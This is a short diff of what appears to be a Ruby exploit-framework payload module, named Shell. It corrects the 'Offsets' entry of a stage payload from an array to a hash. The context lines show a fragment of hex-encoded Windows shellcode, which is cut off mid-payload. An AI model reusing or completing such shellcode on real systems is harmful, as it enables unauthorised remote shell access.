@@ -22,9 +22,9 @@ module Shell
 			'StagePayload'  =>
 				{
 					'Offsets' =>
-						[
+						{
 							'EXITFUNC' => [ 103 + 28, 'V' ]
-						],
+						},
 					'Payload' =>
 						"\xe8\x09\x00\x00\x00\x41\x44\x56\x41\x50\x49\x33\x32\x00\xff\x55" +
 						"\x08\x50\x68\x2a\xc8\xde\x50\xff\x55\x04\xff\xd0" +
